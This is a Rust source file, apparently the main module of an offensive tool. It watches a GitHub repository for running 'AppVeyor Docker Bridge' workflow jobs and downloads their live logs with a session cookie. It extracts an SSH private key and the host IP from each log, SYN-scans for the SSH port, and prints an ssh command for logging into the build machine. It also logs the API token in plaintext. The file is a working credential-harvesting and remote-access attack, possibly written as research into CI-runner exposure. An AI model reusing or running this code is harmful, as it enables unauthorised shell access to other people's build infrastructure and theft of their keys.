mod macros;
mod parsing;
mod portscan;
mod workflows;
mod zip;

use anyhow::Context;
use portscan::syn_scan;
use std::time::Duration;
use tokio::time::sleep;
use tracing::{info, level_filters::LevelFilter, warn};
use tracing_subscriber::EnvFilter;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let filter = EnvFilter::builder()
        .with_default_directive(LevelFilter::INFO.into())
        .from_env()?
        .add_directive("pistol::utils=error".parse()?);
    tracing_subscriber::fmt()
        .with_env_filter(filter)
        .compact()
        .with_line_number(true)
        .with_file(true)
        .init();

    // Use the environment variables for configuration
    let token = match std::env::var("TOKEN") {
        Ok(token) => token,
        Err(e) => panic!("{e}"),
    };
    let owner = match std::env::var("OWNER") {
        Ok(owner) => owner,
        Err(e) => panic!("{e}"),
    };
    let repo = match std::env::var("REPO") {
        Ok(repo) => repo,
        Err(e) => panic!("{e}"),
    };

    info!("Token: {token}");
    info!("Owner: {owner}");
    info!("Repository: {repo}");

    let client = authclient!(token);
    loop {
        let repo_workflows = workflows::get_repo_workflows(client, &owner, &repo).await?;
        let runs = repo_workflows.get("workflow_runs").unwrap();

        if let Some(wfruns) = runs.as_array() {
            // Retrieve the run IDs
            let mut ids = wfruns
                .iter()
                .filter(|x| {
                    if let Some(status) = x.get("status") {
                        status != "completed"
                    } else {
                        false
                    }
                })
                .filter(|x| {
                    if let Some(name) = x.get("name") {
                        name == "AppVeyor Docker Bridge"
                    } else {
                        false
                    }
                })
                .filter_map(|x| {
                    if let Some(head_sha) = x.get("head_sha") {
                        if let Some(id) = x.get("id") {
                            if let Some(head) = head_sha.as_str() {
                                if let Some(id) = id.as_i64() {
                                    return Some((id, head.to_string()));
                                }
                            }
                        }
                    }
                    None
                })
                .collect::<Vec<(i64, String)>>();

            if !ids.is_empty() {
                ids.sort_by_key(|x| x.0);
                ids.reverse();
                let id = ids[0].0;
                let commit_sha = &ids[0].1;
                info!("Download log id: {id}, commit: {commit_sha}");

                // Retrieve job id from jobs endpoint
                let job_ids = workflows::get_workflow_jobs(client, &owner, &repo, id).await?;
                let job_ids = job_ids.get("jobs").unwrap();
                if let Some(job_ids) = job_ids.as_array() {
                    let job_ids = job_ids
                        .iter()
                        .filter_map(|x| x.get("id"))
                        .filter_map(|x| x.as_i64())
                        .collect::<Vec<i64>>();

                    // Download the current log with the cookie session
                    let log;
                    loop {
                        match workflows::get_running_log(&owner, &repo, commit_sha, job_ids[0], 2)
                            .await
                        {
                            Ok(l) => {
                                log = l;
                                break;
                            }
                            Err(e) => warn!("Can't get run log, retry. Error: {e}"),
                        }
                    }
                    //let log = get_running_log(&owner, &repo, commit_sha, job_ids[0], 2).await?;
                    println!("{log}");

                    // Extract private key
                    let filename = format!("{owner}_{repo}_{commit_sha}_{}", job_ids[0]);
                    parsing::store_private_key(&log, &filename).await?;

                    let Ok(host_ip) = parsing::extract_host_ip(&log).await else {
                        // Log was not fully completed. Just try the download again.
                        continue;
                    };
                    let user = "appveyor";

                    let ssh_port = syn_scan(&host_ip, 33801..33800 + 254)?;
                    ssh_port.iter().for_each(|p| println!("SSH Port: {p}"));
                    println!(
                        "ssh -i ./out/{filename} -p {} {user}@{host_ip}",
                        ssh_port.first().context("Could not parse SSH Port")?
                    );
                }
            } else {
                info!("No running job");
            }
        }
        sleep(Duration::from_secs(10)).await;
    }
}
